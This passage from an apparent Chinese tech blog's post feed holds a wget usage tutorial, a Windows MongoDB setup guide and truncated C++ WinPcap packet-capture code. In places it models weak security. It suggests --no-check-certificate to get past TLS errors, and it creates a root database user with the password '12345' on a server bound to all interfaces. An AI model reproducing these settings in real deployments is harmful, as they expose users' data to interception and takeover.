GZIP 压缩 WARC 文件</span><br><span class="line">       --no-warc-digests           不要计算 SHA1 摘要</span><br><span class="line">       --no-warc-keep-log          不要在 WARC 记录中存储日志文件</span><br><span class="line">       --warc-tempdir=目录         WARC 写入器的临时文件目录</span><br><span class="line">递归下载：</span><br><span class="line">  -r,  --recursive                 指定递归下载</span><br><span class="line">  -l,  --level=数字                最大递归深度 (inf 或 0 代表无限制，即全部下载)。</span><br><span class="line">       --delete-after             下载完成后删除本地文件</span><br><span class="line">  -k,  --convert-links            让下载得到的 HTML 或 CSS 中的链接指向本地文件</span><br><span class="line">       --convert-file-only         只转换 URL 的文件部分（一般叫做“基础名”/basename）</span><br><span class="line">       --backups=N                 写入文件 X 前，轮换移动最多 N 个备份文件</span><br><span class="line">  -K,  --backup-converted         在转换文件 X 前先将它备份为 X.orig。</span><br><span class="line">  -m,  --mirror                   -N -r -l inf --no-remove-listing 的缩写形式。</span><br><span class="line">  -p,  --page-requisites          下载所有用于显示 HTML 页面的图片之类的元素。</span><br><span class="line">       --strict-comments          用严格方式 (SGML) 处理 HTML 注释。</span><br><span class="line">递归接受/拒绝：</span><br><span class="line">  -A,  --accept=列表               逗号分隔的可接受的扩展名列表</span><br><span class="line">  -R,  --reject=列表               逗号分隔的要拒绝的扩展名列表</span><br><span class="line">       --accept-regex=REGEX        匹配接受的 URL 的正则表达式</span><br><span class="line">       --reject-regex=REGEX        匹配拒绝的 URL 的正则表达式</span><br><span class="line">       --regex-type=类型           正则类型 (posix|pcre)</span><br><span class="line">  -D,  --domains=列表              逗号分隔的可接受的域名列表</span><br><span class="line">       --exclude-domains=列表      逗号分隔的要拒绝的域名列表</span><br><span class="line">       --follow-ftp                跟踪 HTML 文档中的 FTP 链接</span><br><span class="line">       --follow-tags=列表          逗号分隔的跟踪的 HTML 标识列表</span><br><span class="line">       --ignore-tags=列表          逗号分隔的忽略的 HTML 标识列表</span><br><span class="line">  -H,  --span-hosts                递归时转向外部主机</span><br><span class="line">  -L,  --relative                  仅跟踪相对链接</span><br><span class="line">  -I,  --include-directories=列表  允许目录的列表</span><br><span class="line">       --trust-server-names        使用重定向 URL 的最后一段作为本地文件名</span><br><span class="line">  -X,  --exclude-directories=列表  排除目录的列表</span><br><span class="line">  -np, --no-parent                 不追溯至父目录</span><br></pre></td></tr></table></figure>

<p>如此多的参数,看着实在望而生畏,不过好在这是有中文的,所以…慢慢来</p>
<p>下面以实例来介绍该用具的主要用法</p>
<h4 id="下载单个文件"><a href="#下载单个文件" class="headerlink" title="下载单个文件"></a>下载单个文件</h4><p># wget <a href="https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz</a> -P save_files -O wget.tar.gz</p>
<blockquote>
<p>–2018-01-06 17:22:48– <a href="https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz</a><br>正在解析主机 ftp.gnu.org (ftp.gnu.org)… 208.118.235.20, 2001:4830:134:3::b<br>正在连接 ftp.gnu.org (ftp.gnu.org)|208.118.235.20|:443… 已连接。<br>已发出 HTTP 请求，正在等待回应… 200 OK<br>长度：4202290 (4.0M) [application/x-gzip]<br>正在保存至: “wget.tar.gz”<br>6%[=&gt; ] 280.00K 21.8KB/s 剩余 3m 6s</p>
</blockquote>
<ul>
<li><p>-O 指定输出文件的名字</p>
</li>
<li><p>-P 指定保存文件的目录 (未指定该参数默认保存在当前路径)</p>
<h4 id="下载多个文件"><a href="#下载多个文件" class="headerlink" title="下载多个文件"></a>下载多个文件</h4><p>可以把要下载的多个链接地址保存到一个文件中,并在wget时指定 -i 参数</p>
</li>
</ul>
<p>#  wget -i files.txt</p>
<h4 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h4><p>有时候在下载一个比较大的文件,碰到网络环境不好或者突然断网了,那么要重新下载这个文件了.为了避免这种情况发生,大多数下载软件都支持断点续传.顾名思义,就是在网络等问题的影响下而被中断下载后,等到网络恢复后,在原来的地方接着下载.</p>
<p>wget也支持该功能,由参数 <strong>-c</strong> 指定<br># wget -c <a href="https://baidu.com" target="_blank" rel="noopener">https://baidu.com</a> -t 5</p>
<ul>
<li>-t 指定<strong>重试次数</strong> ,0 表示无限制</li>
</ul>
<h4 id="代理下载"><a href="#代理下载" class="headerlink" title="代理下载"></a>代理下载</h4><p>要下载一个国外的文件,有时运气不好(被墙),导致无法下载所需文件.这时就要使用代理了,而不是纠结该链接地址有问题.</p>
<p>说到代理,可以是本地搭建代理的服务器,也可以从网络上获得的公共服务器,这里以本地代理服务器为例.<br>不过在此之前我已设置好了代理服务器,该服务器为: <a href="http://127.0.0.1:8087" target="_blank" rel="noopener">http://127.0.0.1:8087</a></p>
<p># wget <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> -O output.html <strong>-e “use_proxy=on” -e “https_proxy=<a href="http://127.0.0.1:8087“" target="_blank" rel="noopener">http://127.0.0.1:8087“</a></strong></p>
<ul>
<li>-e 运行一个“.wgetrc”风格的命令,<strong>wgetrc</strong>文件位于 /etc/wgetrc,为wget运行时的初始化文件.也可以在该文件里设置代理服务器地址(全局变量)</li>
<li>use_proxy=on/no 使用/禁止代理,一般使用代理时,要指明该操作</li>
<li>http_proxy/https_proxy/ftp_proxy 3种协议的代理服务器,格式<strong>皆为</strong>: <a href="http://proxy.yoyodyne.com:18023" target="_blank" rel="noopener">http://proxy.yoyodyne.com:18023</a></li>
</ul>
<p>运行该命令输出如下</p>
<blockquote>
<p>–2018-01-06 17:45:29– <a href="https://www.google.com/" target="_blank" rel="noopener">https://www.google.com/</a><br>正在连接 127.0.0.1:8087… 已连接。<br>错误: “<a href="http://www.google.com”" target="_blank" rel="noopener">www.google.com”</a> 的证书不可信。<br>错误: “<a href="http://www.google.com”" target="_blank" rel="noopener">www.google.com”</a> 的证书颁发者未知。<br>错误: “<a href="http://www.google.com”" target="_blank" rel="noopener">www.google.com”</a> 的证书使用不安全的算法签名。</p>
</blockquote>
<p>注意该处,我用的是 <strong>gae_proxy</strong> ,由于证书问题而出现该错误,解决方法两种</p>
<ul>
<li>直接在原来命令行后加上 <strong>–no-check-certificate</strong>选项 ,表示不检查证书安全问题,忽略该过程.且<strong>错误</strong>变成了<strong>警告</strong></li>
<li>指定证书,我的是 <strong>CA.crt</strong> 用到 <strong>–ca-certificate</strong> 选项,之后便可正常下载了.如:</li>
</ul>
<blockquote>
<p>wget <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> -O output.html –progress=dot -e “use_proxy=on” -e “https_proxy=<a href="http://127.0.0.1:8087“" target="_blank" rel="noopener">http://127.0.0.1:8087“</a> <strong>–ca-certificate=data/gae_proxy/CA.crt</strong></p>
</blockquote>
<h4 id="限速下载"><a href="#限速下载" class="headerlink" title="限速下载"></a>限速下载</h4><p># wget <strong>–limit-rate=10k</strong> <a href="https://ftp.gnu.org/gnu/wget/wget-1.18.tar.gz" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/wget/wget-1.18.tar.gz</a></p>
<ul>
<li>–limit-rate 指定要限制的大小</li>
</ul>
<p><img src="/uploads/images/wget/file_002.gif" alt="img"></p>
<h4 id="测试下载链接"><a href="#测试下载链接" class="headerlink" title="测试下载链接"></a>测试下载链接</h4><p># wget –spider <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a></p>
<blockquote>
<p>打开 Spider 模式。检查是否存在远程文件。<br>–2018-01-06 18:13:16– <a href="http://baidu.com/" target="_blank" rel="noopener">http://baidu.com/</a><br>正在解析主机 baidu.com (baidu.com)… 111.13.101.208, 123.125.114.144, 220.181.57.217<br>正在连接 baidu.com (baidu.com)|111.13.101.208|:80… 已连接。<br>已发出 HTTP 请求，正在等待回应… 200 OK<br>长度：81 [text/html]<br><strong>存在远程文件且该文件可能含有更深层的链接，但不能进行递归操作 – 无法获取</strong></p>
</blockquote>
<ul>
<li>通过 –spider参数,可以测试下载链接是否有效</li>
</ul>
<p>最后一个例子:</p>
<p># wget –user-agent=”Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36” <a href="https://ftp.gnu.org/gnu/wget/wget-1.18.tar.xz" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/wget/wget-1.18.tar.xz</a> -e “use_proxy=on” -e “http_proxy=<a href="http://127.0.0.1:8087“" target="_blank" rel="noopener">http://127.0.0.1:8087“</a> -t 5 -P save_file –progress=dot</p>
<p>更多的参数还是要去查看帮助文档的…</p>
<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><p>bye~</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB数据库搭建(Windows)</title>
    <url>/win-mongodb/</url>
    <content><![CDATA[<p>关于MongoD非关系数据库，网上有太多的解释，与其讲得再多，还不如亲自体验一下</p>
<a id="more"></a>

<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><p>有用过MySQL，PostgreSQL，sqlite3等这些数据库的，是时候应该考虑下MongoDB了。。此处之外，MongoDB搭建也是非常简单的，本文以windows系统为例（问：为什么不是Linux？答：我想怎么玩就这么怎么玩！管得着？）</p>
<p>测试环境：</p>
<blockquote>
<p>Windows 10<br>MongoDB 3.6.3</p>
</blockquote>
<p><a href="https://www.mongodb.com" target="_blank" rel="noopener">下载地址见官网</a></p>
<p>下载完成后是一个压缩文件，解压后bin目录下有如下文件<br><img src="/uploads/images/windows/file_001.png" alt="img"></p>
<p>mongod.exe 数据库服务器进程（守护进程）<br>mongo.exe 用于与服务器进行交互的shell控制台（JavaScript）<br>mongoexport.exe 数据导出（备份）<br>mongoimport.exe 数据导入（恢复）</p>
<p>进入CMD，cd 到mongoDB bin目录，通过 <code>mongod.exe --help</code> 可查看可执行文件的参数列表，参数还挺多的。。。<br><img src="/uploads/images/windows/file_002.png" alt="img"></p>
<p>注意那一个参数</p>
<blockquote>
<p>-f [ –config ] arg configuration file specifying additional options</p>
</blockquote>
<p>可以指定一个配置文件作为服务器启动的参数<br>比如以下几个参数：</p>
<blockquote>
<p>dbpath=C:\MongoDB\data\db<br>logpath=C:\MongoDB\logs\mongo.log<br>logappend=true<br>port=27017<br>auth=true<br>bind_ip_all=true</p>
</blockquote>
<p><strong>dbpath</strong> 指定database<strong>目录</strong>，默认为 <strong>C:\data\db\</strong><br><strong>logpath</strong> 指定日志<strong>文件</strong>，而不是标准输出到console。注意是文件，不是目录！<br><strong>logappend</strong> 指定以追加的模式写入日志文件，而不是覆盖<br><strong>port</strong> 指定服务器监听的端口，默认 27017<br><strong>auth</strong> 指定访问数据库时必须要经过身份验证<br><strong>bind_ip_all</strong> 绑定（监听）所有IP地址，或者 <strong>bind_ip</strong> 指定要绑定的IP地址列表，默认 <strong>localhost</strong><br>关于配置文件更详细信息还得去官网查查…</p>
<p>MongoDB根目录下所有的文件，不存在的目录和文件自行创建</p>
<blockquote>
<p>C:\MongoDB<br>|–bin<br>——-|– …<br>|–conf<br>——-|– mongo.conf<br>|–data<br>——-|– db<br>|–logs<br>——-|– mongo.log</p>
</blockquote>
<p>之后在<br><code>mongod.exe --config c:\MongoDB\conf\mongo.conf</code><br><img src="/uploads/images/windows/file_003.png" alt="img"></p>
<p>接着我们输出 show dbs</p>
<blockquote>
<p>&gt;show dbs<br>2018-02-21T10:29:48.852+0800 E QUERY [thread1] Error: listDatabases failed:{<br>“ok” : 0,<br>“errmsg” : “not authorized on admin to execute command { listDatabases: 1.0, $db: \”admin\” }”,<br>“code” : 13,<br>“codeName” : “Unauthorized”<br>} :<br>_getErrorWithCode@src/mongo/shell/utils.js:25:13<br>Mongo.prototype.getDBs@src/mongo/shell/mongo.js:65:1<br>shellHelper.show@src/mongo/shell/utils.js:816:19<br>shellHelper@src/mongo/shell/utils.js:706:15<br>@(shellhelp2):1:1<br>&gt;</p>
</blockquote>
<p>报错了，因为没有权限列举出所有的database，这就是之前的 <strong>auth</strong> 的作用。那么现在创建一个用户</p>
<blockquote>
<p>&gt; <strong>use admin</strong><br>switched to db admin<br>&gt; <strong>db.createUser({user:’fuck’,pwd:’12345’,roles:[{role:’root’,db:’admin’}]})</strong></p>
<p>Successfully added user: {<br>“user” : “fuck”,<br>“roles” : [<br>{<br>“role” : “root”,<br>“db” : “admin”<br>}<br>]<br>}<br>&gt;</p>
</blockquote>
<p>首先，切换到 admin 这个database，然后通过 <code>db.createUser</code> 来创建一个新的用户，这里创建一个root权限的用户 :)<br>exit，重新进入 mongo console<br>再次 <code>show dbs</code>，同样报错。接着</p>
<blockquote>
<p>&gt;use admin<br>&gt;db.auth(‘fuck’,’12345’)<br>&gt;1<br>&gt;show dbs<br>admin 0.000GB<br>config 0.000GB<br>local 0.000GB<br>1 说明验证成功；0 验证失败</p>
</blockquote>
<p>现在我们已经成功搭建的MongoDB服务器。。等等，那么我们下次开机还不是还要重新通过命令行来启动服务器？这样也太麻烦了吧。是的，所以可以把MongoDB添加到系统服务里面，让它开机自启动。</p>
<p>还记得 <code>mongod.exe --help</code>吗？我们可以找找有哪些参数有用得到的。。。</p>
<p>Windows服务控制管理</p>
<blockquote>
<p>Windows Service Control Manager options:<br><strong>–install</strong> install Windows service<br><strong>–remove</strong> remove Windows service<br>-<strong>-reinstall</strong> reinstall Windows service (equivalent<br>to –remove followed by –install)<br><strong>–serviceName</strong> arg Windows service name<br><strong>–serviceDisplayName</strong> arg Windows service display name<br><strong>–serviceDescription</strong> arg Windows service description<br><strong>–serviceUser</strong> arg account for service execution<br><strong>–servicePassword</strong> arg password used to authenticate<br>serviceUser</p>
</blockquote>
<p>那么，我们可以这样做，通过 –install 安装系统服务</p>
<blockquote>
<p>mongod.exe –config c:\MongoDB\conf\mongo.conf <strong>–serviceName MongoDB</strong> –serviceDisplayName MongoDB_Server –serviceDescription “This is my MongoDB Server…” <strong>–install</strong></p>
</blockquote>
<p><img src="/uploads/images/windows/file_004.png" alt="img"></p>
<p>看！是不是OK了，So easy!除此之外，我们还可以把 <code>C:\MongoDB\bin</code> 添加到PATH环境变量里。<br>现在启动该服务或者 <code>net start MongoDB</code>，回到cmd，输入</p>
<blockquote>
<p>mongo -u fuck -p 12345 admin</p>
</blockquote>
<p>-u 指定用户名称<br>-p 指定用户密码<br>后面的 admin 则是要登录的database</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>嗯…很简单吧！除此之外，MongoDB数据库提供的编程接口也是支持大多数语言的，比如 C，C++，Java，Python，PHP……具体可从官网上查看使用方法。对于C/C++，似乎挺复杂的。</p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>利用winpcap获取网络数据传输</title>
    <url>/winpcap-use/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
<p><strong>winpcap</strong>(windows packet capture)是windows平台下一个免费，公共的网络访问系统。开发winpcap这个项目的目的在于为win32应用程序提供访问网络底层的能力。它用于windows系统下的直接的网络编程。</p>
<p><strong>驱动功能</strong><br>捕获原始数据包，包括在共享网络上各主机发送/接收的以及相互之间交换的数据包；<br>在数据包发往应用程序之前，按照自定义的规则将某些特殊的数据包过滤掉；<br>在网络上发送原始的数据包；<br>收集网络通信过程中的统计信息。</p>
</blockquote>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>在使用之前，可以到winpcap官网下载安装 </p>
<p>代码说明一切</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  HAVE_REMOTE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* packet handler 函数原型 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">packet_handler</span><span class="params">(u_char *param, <span class="keyword">const</span> struct pcap_pkthdr *header, <span class="keyword">const</span> u_char *pkt_data)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Ethernet_IPv4 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Ethernet_ARP 0x0806</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Ethernet帧 size:14(Ethernet II)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EthernetHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       BYTE byDestMac[<span class="number">6</span>];</span><br><span class="line">       BYTE bySrcMac[<span class="number">6</span>];     </span><br><span class="line">       USHORT usType;  </span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//TCP 头信息 size:20</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TCPHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       USHORT m_sSourPort;   <span class="comment">// 源端口号16bit</span></span><br><span class="line">       USHORT m_sDestPort;   <span class="comment">// 目的端口号16bit</span></span><br><span class="line">       ULONG m_uiSequNum;<span class="comment">// 序列号32bit</span></span><br><span class="line">       ULONG m_uiAcknowledgeNum;  <span class="comment">// 确认号32bit</span></span><br><span class="line">       USHORT m_sHeaderLenAndFlag;<span class="comment">// 前4位：TCP头长度；中6位：保留；后6位：标志位</span></span><br><span class="line">       USHORT m_sWindowSize;<span class="comment">// 窗口大小16bit</span></span><br><span class="line">       USHORT m_sCheckSum;<span class="comment">// 检验和16bit</span></span><br><span class="line">       USHORT m_surgentPointer;<span class="comment">// 紧急数据偏移量16bit</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ARP 头信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ARPHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       USHORT usHardwareType;<span class="comment">//Ethernet(1)</span></span><br><span class="line">       USHORT ProtocolType;<span class="comment">//IPv4(0x0800)</span></span><br><span class="line">       BYTE byHardwareSize;</span><br><span class="line">       BYTE byProtocolSize;</span><br><span class="line">       BYTE byOpcode;<span class="comment">//request(1)</span></span><br><span class="line">       BYTE bySenderMAC[<span class="number">6</span>];</span><br><span class="line">       DWORD dwSenderIPaddress;</span><br><span class="line">       BYTE byTargetMAC[<span class="number">6</span>];</span><br><span class="line">       DWORD dwTargetIPaddress;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 4字节的IP地址 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IPAddress</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       u_char byte1;</span><br><span class="line">       u_char byte2;</span><br><span class="line">       u_char byte3;</span><br><span class="line">       u_char byte4;</span><br><span class="line">&#125; <span class="built_in">IPAddress</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* IPv4 首部 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IPHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       BYTE m_byVerHLen;     <span class="comment">//4位版本+4位首部长度</span></span><br><span class="line">       BYTE m_byTOS;                    <span class="comment">//服务类型</span></span><br><span class="line">       USHORT m_usTotalLen; <span class="comment">//总长度</span></span><br><span class="line">       USHORT m_usID; <span class="comment">//标识</span></span><br><span class="line">       USHORT m_usFlagFragOffset; <span class="comment">//3位标志+13位片偏移</span></span><br><span class="line">       BYTE m_byTTL; <span class="comment">//TTL</span></span><br><span class="line">       BYTE m_byProtocol; <span class="comment">//协议</span></span><br><span class="line">       USHORT m_usHChecksum; <span class="comment">//首部检验和</span></span><br><span class="line">       DWORD m_ulSrcIP; <span class="comment">//源IP地址</span></span><br><span class="line">       DWORD m_ulDestIP; <span class="comment">//目的IP地址</span></span><br><span class="line">&#125;IPHeader;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* IPv4 首部 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IPHeader2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       BYTE m_byVerHLen;     <span class="comment">//4位版本+4位首部长度</span></span><br><span class="line">       BYTE m_byTOS;                    <span class="comment">//服务类型</span></span><br><span class="line">       USHORT m_usTotalLen; <span class="comment">//总长度</span></span><br><span class="line">       USHORT m_usID; <span class="comment">//标识</span></span><br><span class="line">       USHORT m_usFlagFragOffset; <span class="comment">//3位标志+13位片偏移</span></span><br><span class="line">       BYTE m_byTTL; <span class="comment">//TTL</span></span><br><span class="line">       BYTE m_byProtocol; <span class="comment">//协议</span></span><br><span class="line">       USHORT m_usHChecksum; <span class="comment">//首部检验和</span></span><br><span class="line">       <span class="built_in">IPAddress</span> m_ulSrcIP; <span class="comment">//源IP地址</span></span><br><span class="line">       <span class="built_in">IPAddress</span> m_ulDestIP; <span class="comment">//目的IP地址</span></span><br><span class="line">&#125;IPHeader2;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* UDP 首部*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UDPHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       USHORT src_port;          <span class="comment">// 源端口(Source port) </span></span><br><span class="line">       USHORT dest_port;          <span class="comment">// 目的端口(Destination port) </span></span><br><span class="line">       USHORT datalen;            <span class="comment">// UDP数据包长度(Datagram length) </span></span><br><span class="line">       USHORT checksum;            <span class="comment">// 校验和(Checksum) </span></span><br><span class="line">&#125; UDPHeader;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ICMP头信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ICMPHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       BYTE m_byType; <span class="comment">//类型</span></span><br><span class="line">       BYTE m_byCode; <span class="comment">//代码</span></span><br><span class="line">       USHORT m_usChecksum; <span class="comment">//检验和</span></span><br><span class="line">       USHORT m_usID; <span class="comment">//标识符</span></span><br><span class="line">       USHORT m_usSeq; <span class="comment">//序号</span></span><br><span class="line">       ULONG m_ulTimeStamp; <span class="comment">//时间戳（非标准ICMP头部）</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//适配器的详细信息</span></span><br><span class="line">       <span class="keyword">pcap_if_t</span> *alldevs;</span><br><span class="line">       <span class="keyword">pcap_if_t</span> *d;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">char</span> errorbuff[PCAP_ERRBUF_SIZE];</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Winpcap lib version:\n%s \n"</span>, pcap_lib_version());</span><br><span class="line">       <span class="keyword">if</span> (pcap_findalldevs( &amp;alldevs, errorbuff) == PCAP_ERROR)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"error.."</span>);</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">char</span> Name[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">       <span class="comment">//过滤时用的子网掩码 </span></span><br><span class="line">       u_int ulNetMask;</span><br><span class="line">       <span class="keyword">for</span> (d=alldevs ;d!=<span class="literal">NULL</span>;d=d-&gt;next)</span><br><span class="line">       &#123;</span><br><span class="line"> </span><br><span class="line">              <span class="keyword">if</span> (index==<span class="number">1</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="keyword">for</span> (<span class="keyword">pcap_addr_t</span> *tmp = d-&gt;addresses, *t = <span class="literal">NULL</span>;tmp != t;tmp = tmp-&gt;next)</span><br><span class="line">                     &#123;</span><br><span class="line">                            <span class="comment">//掩码</span></span><br><span class="line">                            ulNetMask = ((sockaddr_in*)(tmp-&gt;netmask))-&gt;sin_addr.S_un.S_addr;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"NetMask: %s\n"</span>, inet_ntoa(((sockaddr_in*)(tmp-&gt;netmask))-&gt;sin_addr));</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ulNetMask);</span><br><span class="line">                     &#125;</span><br><span class="line"> </span><br><span class="line">                     <span class="built_in">strcpy</span>(Name, d-&gt;name);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"description:%s\n"</span>, d-&gt;description);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"name:%s\n"</span>, d-&gt;name);</span><br><span class="line"> </span><br><span class="line">                    </span><br><span class="line">              <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     pcap_addr *  next     指向下一个地址的指针</span></span><br><span class="line"><span class="comment">                     sockaddr *  addr       IP地址</span></span><br><span class="line"><span class="comment">                     sockaddr *  netmask  子网掩码</span></span><br><span class="line"><span class="comment">                     sockaddr *  broadaddr   广播地址</span></span><br><span class="line"><span class="comment">                     sockaddr *  dstaddr        目的地址             </span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line"> </span><br><span class="line">              <span class="comment">//获取 ip 地址</span></span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">pcap_addr_t</span> *tmp = d-&gt;addresses, *t=<span class="literal">NULL</span>;tmp != t;tmp = tmp-&gt;next)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="keyword">if</span> (tmp-&gt;addr-&gt;sa_family == AF_INET)</span><br><span class="line">                     &#123;</span><br><span class="line">                            <span class="keyword">if</span> (tmp-&gt;addr)</span><br><span class="line">                            &#123;</span><br><span class="line">                                   <span class="built_in">printf</span>(<span class="string">"address:%s\n"</span>, inet_ntoa(((sockaddr_in*)tmp-&gt;addr)-&gt;sin_addr));</span><br><span class="line">                            &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;</span><br><span class="line"> </span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"————————————————————\n"</span>);</span><br><span class="line">              index++;</span><br><span class="line"> </span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">pcap_t</span> *adHande = pcap_open(Name,</span><br><span class="line">              <span class="number">65536</span>,</span><br><span class="line">              PCAP_OPENFLAG_PROMISCUOUS,<span class="comment">// 混杂模式</span></span><br><span class="line">              <span class="number">1000</span>, <span class="literal">NULL</span>,</span><br><span class="line">              errorbuff);</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> (adHande!=<span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (pcap_datalink(adHande)==DLT_IEEE802)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"DLT_IEEE802\n"</span>);</span><br><span class="line">              &#125;</span><br><span class="line"> </span><br><span class="line">              <span class="keyword">if</span> (pcap_datalink(adHande) == DLT_EN10MB)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"DLT_EN10MB\n"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (pcap_datalink(adHande) != DLT_EN10MB)</span><br><span class="line">              &#123;</span><br><span class="line">                     pcap_freealldevs(alldevs);</span><br><span class="line">              &#125;     </span><br><span class="line">              <span class="comment">/* 不用关心掩码，在这个过滤器中，它不会被使用 */</span></span><br><span class="line">              ulNetMask = <span class="number">0xffffffff</span>;</span><br><span class="line">              bpf_program bpf_pro = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">              <span class="keyword">if</span> (pcap_compile(adHande, &amp;bpf_pro, <span class="string">"tcp or ip or icmp  or arp"</span>, <span class="number">1</span>, ulNetMask) &lt; <span class="number">0</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"-----------&gt;error:pcap_compile\n"</span>);</span><br><span class="line">                     pcap_freealldevs(alldevs);</span><br><span class="line">                     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//设置过滤条件</span></span><br><span class="line">              <span class="keyword">if</span> (pcap_setfilter(adHande, &amp;bpf_pro) &lt; <span class="number">0</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"-----------&gt;error:pcap_setfilter\n"</span>);</span><br><span class="line">                     pcap_freealldevs(alldevs);</span><br><span class="line">                     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">              &#125;</span><br><span class="line"> </span><br><span class="line">      </span><br><span class="line">              